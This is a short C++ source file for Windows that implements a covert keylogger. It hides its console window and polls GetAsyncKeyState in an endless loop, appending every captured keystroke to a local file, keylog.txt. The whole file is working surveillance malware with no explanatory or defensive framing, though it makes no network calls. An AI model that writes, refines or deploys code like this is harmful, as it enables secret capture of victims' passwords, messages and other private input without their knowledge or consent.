#include<iostream>
#include<fstream>
#include<windows.h>

void logKye(char key) {
	std::ofstream logFile;
	logFile.open("keylog.txt", std::ios::app);

	if (logFile.is_open()){
		logFile << key;
		logFile.close();
	}
}


void kyeLogger() {
	char key;
	while (true) {
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) & 0x0001) {
				logKye(key);
			}
		}
	}
}

int main()
{
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	kyeLogger();

		return 0;
}
